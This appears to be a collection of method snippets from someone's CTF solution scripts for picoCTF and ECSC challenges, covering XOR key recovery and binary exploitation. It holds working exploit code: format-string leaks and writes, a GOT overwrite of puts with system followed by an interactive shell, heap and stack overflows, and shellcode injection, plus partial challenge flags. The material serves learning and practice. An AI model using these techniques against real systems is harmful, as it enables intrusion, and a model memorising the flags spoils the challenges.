	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.menu_num = 0
        self.menu_text = "==> "
        self.local_preparations()
        self.initiate_connection()
        self.help_num = 13

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def local_preparations(self):
        if self.conn == "remote":
            return
        self.challenge_file = self.Path(self.parent, "challenge", self.file)
        self.folder_challenge = self.Path(self.parent, "challenge")
        self.prepare_space(
            files=["flag.txt"],
            folder=self.folder_challenge,
        )

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def de_hexing_flag(self, flag):
        flag = flag[0].decode("utf-8").strip("\n").strip(" ")
        flag = [chr(int(letter, 16)) for letter in flag.split(" ")]
        flag = "".join(flag)
        return flag

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/Picker_3/payloads/solution.py
    def main(self):

        # This was useless to get the func tables and stuff

        # self.send_menu(choice=2)
        # self.conn.recvuntil("Please enter variable name to read: ".encode())
        # self.conn.sendline("FUNC_TABLE_SIZE".encode())
        # FUNC_TABLE_SIZE = self.recv_menu(number=1, display=True, save=True)[0]

        # self.send_menu(choice=2)
        # self.conn.recvuntil("Please enter variable name to read: ".encode())
        # self.conn.sendline("FUNC_TABLE_ENTRY_SIZE".encode())
        # FUNC_TABLE_ENTRY_SIZE = self.recv_menu(number=1, display=True, save=True)[0]

        # FUNC_TABLE_SIZE = int(FUNC_TABLE_SIZE.decode("utf-8").strip("\n").strip(" "))
        # FUNC_TABLE_ENTRY_SIZE = int(
        #     FUNC_TABLE_ENTRY_SIZE.decode("utf-8").strip("\n").strip(" ")
        # )

        new_func_table = '"{0:128}"'.format("win")
        self.send_menu(choice=3)

        self.conn.recvuntil("Please enter variable name to write: ".encode())
        self.conn.sendline("func_table".encode())

        self.conn.recvuntil("Please enter new value of variable: ".encode())
        self.conn.sendline(new_func_table.encode())

        # Access the first option of the table
        self.send_menu(choice=1)

        flag = self.recv_menu(number=1, display=True, save=True)
        flag = self.de_hexing_flag(flag)
        print(flag)

        self.conn.sendline("quit".encode())

	# /home/figaro/CTF/Categories/ReverseEngineering/picoCTF/keygenme-py/payloads/solution.py
    def main(self):

        username_trial = "PRITCHARD"
        bUsername_trial = b"PRITCHARD"

        key_part_static1_trial = "picoCTF{1n_7h3_|<3y_of_"
        key_part_dynamic1_trial = "xxxxxxxx"
        key_part_static2_trial = "}"

        # I used bUsername_trial because enter_liscence used it as well but after testing afterwards, they output the same answer
        middle_flag = [
            hashlib.sha256(bUsername_trial).hexdigest()[4],
            hashlib.sha256(bUsername_trial).hexdigest()[5],
            hashlib.sha256(bUsername_trial).hexdigest()[3],
            hashlib.sha256(bUsername_trial).hexdigest()[6],
            hashlib.sha256(bUsername_trial).hexdigest()[2],
            hashlib.sha256(bUsername_trial).hexdigest()[7],
            hashlib.sha256(bUsername_trial).hexdigest()[1],
            hashlib.sha256(bUsername_trial).hexdigest()[8],
        ]

        key_part_dynamic1_trial = "".join(middle_flag)
        key_full_template_trial = (
            key_part_static1_trial + key_part_dynamic1_trial + key_part_static2_trial
        )

        print(key_full_template_trial)

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def bytes_to_int_array(self, data):
        """Convert bytes to array of integers"""
        return [b for b in data]

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def int_array_to_bytes(self, data):
        """Convert array of integers to bytes"""
        return bytes(data)

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def xor_decrypt(self, encrypted, key):
        """Perform XOR decryption similar to FUN_00101189"""
        if not key:
            return b""

        result = []
        key_len = len(key)

        for i in range(len(encrypted)):
            result.append(encrypted[i] ^ key[i % key_len])

        return bytes(result)

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def hex_to_bytes_le(self, hex_val, size):
        return hex_val.to_bytes(size, "little")

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def solve_challenge(self):
        """Main function to solve the challenge"""

        # Extract the encrypted data from the decompiled code (little-endian format)
        # Convert hex values to bytes in little-endian order

        # Stage 1 data from local_258, local_250, local_248, local_240, local_238
        encrypted_stage1 = (
            self.hex_to_bytes_le(0x59E9BA9E8F463D01, 8)
            + self.hex_to_bytes_le(0x5B94C9EA56CFFF4F, 8)
            + self.hex_to_bytes_le(0xC1129B387F683E5, 8)
            + self.hex_to_bytes_le(0xC19D94E581D7E07A, 8)
            + self.hex_to_bytes_le(0x2D2E57E4, 4)
        )

        # Stage 2 data from local_228, local_220, local_218, local_210, local_208
        encrypted_stage2 = (
            self.hex_to_bytes_le(0x4E9EF0D5EA375C64, 8)
            + self.hex_to_bytes_le(0x48E7DEA62BDB901D, 8)
            + self.hex_to_bytes_le(0x5A4654DEE5B1D698, 8)
            + self.hex_to_bytes_le(0x8D8E95F2979D8315, 8)
            + self.hex_to_bytes_le(0x703F1481, 4)
        )

        print("[*] Attempting to recover the key...")
        print(f"[*] Stage 1 encrypted data length: {len(encrypted_stage1)}")
        print(f"[*] Stage 2 encrypted data length: {len(encrypted_stage2)}")

        # Try common flag prefixes (focusing on ECSC format)
        common_prefixes = [b"ECSC{", b"ecsc{"]

        for prefix in common_prefixes:
            print(f"\n[*] Trying prefix: {prefix.decode()}")

            # Try different key lengths (minimum 5 as per the code)
            for key_length in range(5, 21):
                print(f"[*] Trying key length: {key_length}")

                # Try to find a key that produces the expected prefix
                # We'll try a brute force approach for short keys
                if key_length <= 8:
                    # For short keys, try common patterns
                    test_keys = [
                        b"hello" + b"a" * (key_length - 5),
                        b"password"[:key_length],
                        b"12345" + b"a" * (key_length - 5),
                        b"admin" + b"a" * (key_length - 5),
                        b"key12" + b"a" * (key_length - 5),
                        b"test1" + b"a" * (key_length - 5),
                    ]

                    for test_key in test_keys:
                        if len(test_key) != key_length:
                            continue

                        # First decrypt stage 1 with the test key
                        stage1_result = self.xor_decrypt(encrypted_stage1, test_key)

                        # Then decrypt stage 2 with stage 1 result
                        final_result = self.xor_decrypt(encrypted_stage2, stage1_result)

                        # Check if result starts with expected prefix
                        if final_result.startswith(prefix):
                            print(f"[+] FOUND POTENTIAL KEY: {test_key}")
                            print(f"[+] Decrypted flag: {final_result}")
                            return test_key, final_result

        # If simple brute force doesn't work, try reverse engineering approach
        print("\n[*] Simple brute force failed. Trying reverse engineering approach...")

        # Assume the flag starts with "ECSC{" and try to work backwards
        target_prefix = b"ECSC{"

        # Try to find what stage1_result should be to produce target_prefix
        for key_len in range(5, 16):
            print(f"[*] Reverse engineering with key length: {key_len}")

            # Calculate what the stage1 result should start with
            stage1_prefix = []
            for i in range(min(len(target_prefix), len(encrypted_stage2))):
                stage1_prefix.append(encrypted_stage2[i] ^ target_prefix[i])

            stage1_prefix_bytes = bytes(stage1_prefix)
            print(f"[*] Stage1 result should start with: {stage1_prefix_bytes.hex()}")

            # Now try to find what key produces this stage1_prefix
            key_candidate = []

            for i in range(min(len(stage1_prefix_bytes), len(encrypted_stage1))):
                key_byte = encrypted_stage1[i] ^ stage1_prefix_bytes[i]
                key_candidate.append(key_byte)

            if len(key_candidate) >= 5:
                # Extend key to full length by repeating pattern
                full_key = (key_candidate * ((key_len // len(key_candidate)) + 1))[
                    :key_len
                ]
                test_key = bytes(full_key)

                print(f"[*] Testing key candidate: {test_key}")

                # Test this key
                stage1_result = self.xor_decrypt(encrypted_stage1, test_key)
                final_result = self.xor_decrypt(encrypted_stage2, stage1_result)

                print(f"[*] Result: {final_result}")

                # Check if it looks like a valid flag
                if b"ECSC{" in final_result or b"ecsc{" in final_result:
                    print(f"[+] FOUND KEY: {test_key}")
                    print(f"[+] FLAG: {final_result}")
                    return test_key, final_result

        print("[-] Could not find the key automatically")
        return None, None

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/solution.py
    def main(self):
        print("=" * 60)
        print("Key Recovery Script for 'Just a Key' Challenge - ECSC Format")
        print("=" * 60)
        key, flag = self.solve_challenge()

        if key:
            print(f"\n[SUCCESS] Key found: {key}")
            print(f"[SUCCESS] Flag: {flag}")
        else:
            print("\n[FAILED] Could not automatically recover the key")
            print(
                "You may need to analyze the binary further or try manual key recovery"
            )

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def xor_decrypt(self, key_bytes: bytes, input_bytes: bytes) -> bytes:
        key_len = len(input_bytes)
        result = bytearray(key_len)
        for i in range(key_len):
            result[i] = input_bytes[i % len(input_bytes)] ^ key_bytes[i]
        return result

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def mutate_key(self, buf: bytearray, key: bytes) -> bytearray:
        tmp = buf[:]
        for i in range(0, len(key), 5):
            chunk = key[i : i + 5]
            tmp = self.xor_decrypt(tmp, chunk)
        return tmp

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def try_key(self, candidate: str):
        key = candidate.encode()
        if len(key) < 5:
            return None

        # Transform key_step1 using input
        transformed_key = self.mutate_key(self.key_step1, key)
        # First decryption stage
        intermediate = self.xor_decrypt(self.encrypted_intermediate, transformed_key)
        # Final decryption
        flag = self.xor_decrypt(self.encrypted_flag, intermediate)
        return flag

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def bruteforcer(self):

        print("[*] Brute-forcing keys with known prefix:", self.known_prefix)

        for length in range(5, 30):  # keep short for demonstration
            for suffix in product(self.charset, repeat=length - len(self.known_prefix)):
                candidate_key = self.known_prefix + "".join(suffix)
                result = self.try_key(candidate_key)
                print(candidate_key, result)
                if (
                    result
                    and result.startswith(self.flag_prefix)
                    and result[-1] == ord("}")
                ):
                    print("[+] Found key:", candidate_key)
                    print("[+] Flag:", result.decode(errors="ignore"))
                    return

        print("[-] No valid flag found.")

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def smarter_bruteforcer(self):
        """
        Check the first letter first, and then continue
        """
        dummy = "a" * 5  # dummy suffix for length calculation
        for length in range(5, 30):  # keep short for demonstration
            pass

	# /home/figaro/CTF/Categories/ReverseEngineering/ECSC/Just_a_Key/payloads/attempt_01.py
    def main(self):

        step1_key = [
            0x11,
            0x11,
            0x11,
            0x11,
            0x11,
            0x01,
            0x3D,
            0x46,
            0x8F,
            0x9E,
            0xBA,
            0xE9,
            0x59,
            0x4F,
            0xFF,
            0xCF,
            0x56,
            0xEA,
            0xC9,
            0x94,
            0x5B,
            0x05,
            0x3E,
            0x68,
            0x7F,
            0x38,
            0x9B,
            0x12,
            0xC1,
            0x7A,
            0xE0,
            0xD7,
            0x81,
            0xE5,
            0x94,
            0x9D,
            0xC1,
            0xE4,
            0x57,
            0x2E,
            0x2D,
            0x00,
        ]

        self.key_step1 = bytearray.fromhex(
            "11111111"
            "11"
            "00"
            "59e9ba9e8f463d01"
            "5b94c9ea56cfff4f"
            "0c1129b387f683e5"
            "c19d94e581d7e07a"
            "2d2e57e4"
            "00"
        ).ljust(44, b"\x00")

        # From local_258 onward
        self.encrypted_intermediate = bytearray.fromhex(
            "59e9ba9e8f463d01"
            "5b94c9ea56cfff4f"
            "0c1129b387f683e5"
            "c19d94e581d7e07a"
            "2d2e57e4"
        )

        # From local_228 onward
        self.encrypted_flag = bytearray.fromhex(
            "4e9ef0d5ea375c64"
            "48e7dea62bdb901d"
            "5a4654dee5b1d698"
            "8d8e95f2979d8315"
            "703f1481"
        )

        # Charset for brute-forcing
        self.charset = string.ascii_letters + string.digits + "_{}"
        self.known_prefix = ""
        self.flag_prefix = b"ECSC{"

        self.bruteforcer()

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_3/payloads/solution.py
    def __init__(self, **kwargs) -> None:
        super().__init__(**kwargs)
        self.prepare_space(
            files=["flag.txt"], folder=self.folder_files, test_text="picoCTF{test}"
        )
        # self.elf = self.pwn.ELF(self.challenge_file)
        self.initiate_connection()

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_3/payloads/solution.py
    def main(self):
        self.menu_num = 8
        self.menu_text = "Enter your choice: "

        # Init
        self.recv_menu(4)

        self.send_menu("5")
        self.send_menu("2")

        self.conn.recvuntil(b"allocation: ")
        self.conn.sendline(b"31")
        self.conn.recvuntil(b"Data for flag: ")
        self.conn.sendline(b"A" * 30 + b"pico")

        self.send_menu("3")
        self.recv_menu(4, False)

        self.send_menu("4")

        self.recv_menu(2, True)

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def __init__(self, **kwargs) -> None:
        super().__init__(**kwargs)
        self.prepare_space(
            files=["flag.txt"], folder=self.folder_files, test_text="picoCTF{test}"
        )
        self.current_initiate_connection()

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def initiate_connection(self):
        # return super().initiate_connection()
        pass

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def current_initiate_connection(self):
        self.connect(self.conn_type)

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_1/payloads/solution.py
    def main(self):

        # Welcome message
        for _ in range(5):
            out = self.conn.recvline()
            # print(out)

        # Menu
        for _ in range(8):
            out = self.conn.recvline()
            # print(out)

        # Options
        for _ in range(7):
            out = self.conn.recvline()
            # print(out)

        out = self.conn.recvuntil(b"Enter your choice: ")
        # print(out)

        payload = b"A" * 32 + b"pico"

        self.conn.sendline(b"2")

        self.conn.sendline(payload)

        print(self.conn.recvuntil(b"choice: "))

        self.conn.sendline(b"4")

        print(self.conn.recvline())
        print(self.conn.recvline())
        print(self.conn.recvline())
        print(self.conn.recvline())

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def exploitation(self):
        self.initiate_connection()
        self.recv_menu(4)
        self.conn.sendline(b"1")
        self.conn.recvuntil(b"What is your API token?\n")
        self.conn.sendline(b"%p" * 24)
        self.conn.recvline()
        data = self.conn.recvline().strip().decode()
        return data

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def to_hex(self, data):
        if type(data) == str:
            return "".join([hex(ord(c)) for c in data])
        return "".join([hex(ord(c))[2:] for c in data])

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def from_hex(self, data):
        return "".join([chr(int(data[i : i + 2], 16)) for i in range(0, len(data), 2)])

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def data_processing(self, data):

        output = "".join(data.split("(nil)"))

        output = output.strip("0x").split("0x")
        temp = []

        for item in output:
            temp_word = ""
            if len(item) == 8:
                for i in range(0, 8, 2):
                    temp_word = item[i : i + 2] + temp_word
                temp_word = self.from_hex(temp_word)
                temp.append(temp_word)
            else:

                temp.append(self.from_hex(item))

        output = temp
        output = "".join(output)
        return output

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def local_run(self):
        data = "0x9cc74100x804b0000x80489c30xf7ec6d800xffffffff0x10x9cc51600xf7ed41100xf7ec6dc7(nil)0x9cc61800x10x9cc73f00x9cc74100x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x633432610x366134310xff87007d"
        return data

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution.py
    def main(self):
        self.menu_num = 4
        data = self.exploitation()
        data = self.data_processing(data)
        flag = self.re_match_flag(data, "picoCTF")[0]
        print(flag)

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def exploitation(self):

        self.conn = self.pwn.remote(self.url, self.port)

        for _ in range(4):
            self.conn.recvline()

        self.conn.sendline(b"1")

        question = "What is your API token?\n"
        payload = "%p" * 24

        self.conn.recvuntil(question.encode())
        self.conn.sendline(payload.encode())
        self.conn.recvline()
        data = self.conn.recvline().strip().decode()
        return data

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def to_hex(self, data):
        if type(data) == str:
            return "".join([hex(ord(c)) for c in data])
        return "".join([hex(ord(c))[2:] for c in data])

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def from_hex(self, data):
        return "".join([chr(int(data[i : i + 2], 16)) for i in range(0, len(data), 2)])

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def data_processing(self, data):

        output = "".join(data.split("(nil)"))

        output = output.strip("0x").split("0x")
        temp = []

        for item in output:
            temp_word = ""
            if len(item) == 8:
                for i in range(0, 8, 2):
                    temp_word = item[i : i + 2] + temp_word
                temp_word = self.from_hex(temp_word)
                temp.append(temp_word)
            else:

                temp.append(self.from_hex(item))

        output = temp
        output = "".join(output)
        return output

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def re_match_flag(self, text: str, origin: str) -> list[str]:
        """
        Description:
        Find the flag in the text

        Args:
            text (str): Text to search for the flag
            origin (str): Origin of the flag

        Returns:
            str: list of flag found in the text
        """
        flag_pattern = rf"{origin}{{[A-Za-z0-9_]+}}"
        return re.findall(flag_pattern, text)

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/solution_pwntools.py
    def main(self):
        self.menu_num = 4
        data = self.exploitation()
        data = self.data_processing(data)
        flag = self.re_match_flag(data, "picoCTF")[0]
        print(flag)

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def exploitation(self):
        self.initiate_connection()
        self.recv_menu(4)
        self.conn.sendline(b"1")
        self.conn.recvuntil(b"What is your API token?\n")
        self.conn.sendline(b"%p" * 24)
        self.conn.recvline()
        data = self.conn.recvline().strip().decode()
        return data

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def to_hex(self, data):
        if type(data) == str:
            return "".join([hex(ord(c)) for c in data])
        return "".join([hex(ord(c))[2:] for c in data])

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def from_hex(self, data):
        return "".join([chr(int(data[i : i + 2], 16)) for i in range(0, len(data), 2)])

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def data_processing(self, data):

        output = "".join(data.split("(nil)"))

        output = output.strip("0x").split("0x")
        temp = []

        for item in output:
            temp_word = ""
            if len(item) == 8:
                for i in range(0, 8, 2):
                    temp_word = item[i : i + 2] + temp_word
                temp_word = self.from_hex(temp_word)
                temp.append(temp_word)
            else:

                temp.append(self.from_hex(item))

        output = temp
        output = "".join(output)
        return output

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def local_run(self):
        data = "0x9cc74100x804b0000x80489c30xf7ec6d800xffffffff0x10x9cc51600xf7ed41100xf7ec6dc7(nil)0x9cc61800x10x9cc73f00x9cc74100x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x633432610x366134310xff87007d"
        return data

	# /home/figaro/CTF/Categories/Binary/picoCTF/Stonks/payloads/old_solution.py
    def main(self):
        self.menu_num = 4
        data = self.exploitation()
        data = self.data_processing(data)
        flag = self.re_match_flag(data, "picoCTF")[0]
        print(flag)

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_2/payloads/solution.py
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)
        self.prepare_space()
        # self.pwn.context.log_level = "critical"
        self.pwn.context.binary = self.pwn.ELF(Path(self.folder_files, self.file))
        self.initiate_connection()

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_2/payloads/solution.py
    def exec_fmt(self, payload):
        p = CTFSolver(conn=self.conn_type, file=self.file, url=self.url, port=self.port)
        p.initiate_connection()
        p.conn.sendline(payload)
        return p.conn.recvall()

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_2/payloads/solution.py
    def main(self):
        print(self.conn.recvline())

        # This uses the exec_fmt, autofmt in the documentation to find the offset for the payload.
        # To find the address objump -D vuln was used on the binary executable file.
        # When searching for the function "sus" these lines could be seen.z

        autofmt = self.pwn.FmtStr(self.exec_fmt)
        offset = autofmt.offset
        print(f"Offset: {offset}")

        payload = self.pwn.fmtstr_payload(offset, {0x404060: 0x67616C66})
        self.conn.sendline(payload)

        print(self.conn.recvall())

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_3/payloads/solution.py
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)

        self.prepare_space(files=["flag.txt"], folder=self.folder_files)

        self.pwn.context.binary = self.binary = self.pwn.ELF(
            self.challenge_file, checksec=True
        )

        self.library = Path(self.folder_files, "libc.so.6")

        self.libc = self.pwn.ELF(self.library, checksec=False)

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_3/payloads/solution.py
    def exec_func(self, payload):
        p = Solution(conn="local", file=self.file)
        p.initiate_connection()
        p.conn.sendline(payload)
        p.conn.recvline()
        p.conn.recvline()
        res = p.conn.recvline()
        print(res)
        return res.strip()

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_3/payloads/solution.py
    def main(self):

        fmtstr = self.pwn.FmtStr(self.exec_func)
        super().initiate_connection()
        self.conn.recvuntil("libc: ")
        setvbuf = int(self.conn.recvline().strip().decode(), 16)

        self.libc.address = setvbuf - 0x7A3F0

        payload = b"A" * fmtstr.padlen + self.pwn.fmtstr_payload(
            fmtstr.offset, {self.binary.got.puts: self.libc.symbols.system}
        )

        self.conn.sendline(payload)

        self.conn.interactive()

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_0/payloads/solution.py
    def main(self):
        for _ in range(20):
            # print(self.conn.recvline())
            self.conn.recvline()

        print(self.conn.recvuntil(b"Enter your choice: "))

        self.conn.sendline(b"2")

        print(self.conn.recvuntil(b"Data for buffer: "))

        payload = "A" * 32
        print(payload)

        self.conn.sendline(payload)

        for _ in range(7):
            # print(self.conn.recvline())
            self.conn.recvline()

        print(self.conn.recvuntil(b"Enter your choice: "))

        # # To check it
        # self.conn.sendline(b"3")

        # print(self.conn.recvuntil(b"Enter your choice: "))

        # # To check it
        # self.conn.sendline(b"1")

        # print(self.conn.recvuntil(b"Enter your choice: "))

        self.conn.sendline(b"4")

        print(self.conn.recvall())

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_1/payloads/solution.py
    def __init__(self, **kwargs) -> None:
        self.get_parent()
        self.prepare_space()
        super().__init__(**kwargs)

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_1/payloads/solution.py
    def prepare_space(self):
        files = [
            "secret-menu-item-1.txt",
            "secret-menu-item-2.txt",
            "flag.txt",
        ]
        for file in files:
            with open(Path(self.folder_payloads, file), "w") as f:
                f.write("picoCTF{test}")

	# /home/figaro/CTF/Categories/Binary/picoCTF/format_string_1/payloads/solution.py
    def main(self):
        # print(self.file)
        print(self.conn.recvline())
        self.conn.sendline(
            b"%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p"
        )
        print(self.conn.recvline())
        print(self.conn.recvline())

	# /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def generate_pattern(self, length=1, n=8):
        """
        Generates a cyclic pattern of a given length.

        Args:
            length (int): The length of the pattern to generate.
            n (int): The number of unique characters in the pattern.

        Returns:
            str: The generated cyclic pattern.
        """
        return self.pwn.cyclic(length=length, n=n)

	# /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def find_offset(self, pattern, n=8):
        """
        Finds the offset of a given pattern in the cyclic pattern.

        Args:
            pattern (str): The pattern to find the offset for.
            n (int): The number of unique characters in the pattern.

        Returns:
            int: The offset of the pattern.
        """
        return self.pwn.cyclic_find(pattern, n=n)

	# /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def main(self):
        offset = self.local_exploitation()

        # Here is a slight problem that the offset is different than the one that gef gives
        payload = b"A" * offset + b"\xef\xbe\xad\xde"

        self.remote_exploitation(payload)

	# /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def local_exploitation(self):
        """
        Performs local exploitation to find the offset.

        Returns:
            int: The offset found from the local exploitation.
        """
        local = CTFSolver(conn="local", file=self.file, url=self.url, port=self.port)
        local.initiate_connection()

        # Header
        local.recv_lines(number=19, display=False)
        # Two sentence message
        local.recv_lines(number=2, display=False)

        payload = self.generate_pattern(length=300)
        print(f"Pattern: {payload}")

        # Sending payload
        local.send(payload, encode=False)

        output = local.recv_lines(number=2, save=True)

        rpb = str(output[0]).replace("\\n", "").split("==")[1].strip().strip("'")
        print(rpb)
        crash_value = int(rpb, 16)
        offset = self.find_offset(crash_value)
        print(f"Offset: {offset}")
        return offset

	# /home/figaro/CTF/Categories/Binary/picoCTF/clutter-overflow/payloads/solution.py
    def remote_exploitation(self, payload):
        """
        Performs remote exploitation using the given payload.

        Args:
            payload (bytes): The payload to use for remote exploitation.
        """
        remote = CTFSolver(conn="remote", file=self.file, url=self.url, port=self.port)
        remote.initiate_connection()

        # Header
        remote.recv_lines(number=19, display=False)
        # Two sentence message
        remote.recv_lines(number=2, display=True)

        # Sending payload
        remote.send(payload, encode=False)

        remote.recv_lines(number=3, display=True)

	# /home/figaro/CTF/Categories/Binary/picoCTF/basic-file-exploit/payloads/solution.py
    def main(self):
        self.initiate_connection()

        self.menu_text = ""
        self.menu_num = 4

        self.recv_lines(number=self.menu_num, display=True)
        self.send("1")
        self.recv_lines(number=2, display=True)
        self.send("1")
        self.recv_lines(number=2, display=True)
        self.send("1")
        self.recv_lines(number=3, display=True)
        self.send("2")
        self.recv_lines(number=2, display=True)
        self.send("0")
        self.recv_lines(number=2, display=True)

	# /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.menu_num = 0
        self.menu_text = "Enter the address in hex to jump to, excluding '0x': "
        self.local_preparations()
        self.elf = self.pwn.ELF(self.challenge_file)
        self.initiate_connection()

	# /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def local_preparations(self):
        if self.conn == "remote":
            return
        self.challenge_file = self.Path(self.parent, "challenge", self.file)
        self.folder_challenge = self.Path(self.parent, "challenge")
        self.prepare_space(
            files=["flag.txt"],
            folder=self.folder_challenge,
        )

	# /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def get_address(self, function):
        address = self.elf.symbols[function]
        # process address
        return address

	# /home/figaro/CTF/Categories/Binary/picoCTF/Picker_4/payloads/solution.py
    def main(self):

        win_address = self.get_address("win")

        payload = str(hex(win_address)).split("0x")[1]
        self.send_menu(choice=payload)

        flag = self.recv_menu(number=3, display=True, save=True)[2]
        flag = flag.decode("utf-8").strip("\n").strip(" ")
        print(flag)

	# /home/figaro/CTF/Categories/Binary/picoCTF/filtered-shellcode/payloads/solution.py
    def load_shellcode(self):
        shellcode = ""
        exploit_filed = self.folfil(folder="payloads", file="exploit.asm")
        with open(exploit_filed, "r") as f:
            shellcode = f.read()

        shellcode = self.pwn.asm(shellcode)
        print(shellcode)

        return shellcode

	# /home/figaro/CTF/Categories/Binary/picoCTF/filtered-shellcode/payloads/solution.py
    def main(self):

        self.menu_num = 0
        self.menu_text = "Give me code to run:"
        shellcode = self.load_shellcode()
        self.initiate_connection()
        self.recv_until("run:")
        # Note: fix send to be able to send text without encoding it
        # self.send(shellcode)
        self.conn.sendline(shellcode)
        self.conn.interactive()

	# /home/figaro/CTF/Categories/Binary/picoCTF/PIE_TIME/payloads/solution.py
    def get_elf_function_address(self, function):
        """
        Description:
        """
        if self.elf is None:
            self.elf = self.pwn.ELF(self.challenge_file)

        return self.elf.symbols[function]

	# /home/figaro/CTF/Categories/Binary/picoCTF/PIE_TIME/payloads/solution.py
    def challenge_get_offset_address(self):
        offset = self.get_elf_function_address("main") - self.get_elf_function_address(
            "win"
        )
        return offset

	# /home/figaro/CTF/Categories/Binary/picoCTF/PIE_TIME/payloads/solution.py
    def main(self):
        self.initiate_connection()
        self.elf = None
        main_function = self.recv_lines(1, display=False, save=True)[0]

        main_function = main_function.split(b" ")[-1].decode("utf-8").strip("\n")
        main_function = int(main_function, 16)

        win_addr = main_function - self.challenge_get_offset_address()

        menu_text = "Enter the address to jump to, ex => 0x12345: "
        self.recv_send(
            text=hex(win_addr), text_until=menu_text, save=True, display=True
        )

        result = self.recv_lines(3, display=True, save=True)[-1]

        flag = self.re_match_partial_flag(
            text=result.decode("utf-8"), origin="picoCTF{"
        )

        pyperclip.copy(flag[0])

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def __init__(self, **kwargs) -> None:
        super().__init__(**kwargs)
        self.prepare_space(
            files=["flag.txt"], folder=self.folder_files, test_text="picoCTF{test}"
        )
        self.elf = self.pwn.ELF(self.challenge_file)
        self.initiate_connection()

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def get_address(self):
        # win = self.elf.symbols["win"]
        # self.win_address = hex(win)
        self.win_address = self.elf.symbols["win"]
        self.win_address = hex(self.win_address)

	# /home/figaro/CTF/Categories/Binary/picoCTF/heap_2/payloads/solution.py
    def build_payload(self):
        self.payload = b"A" * 32
        self.get_address()
        length = len(hex(self.win_address)) - 2
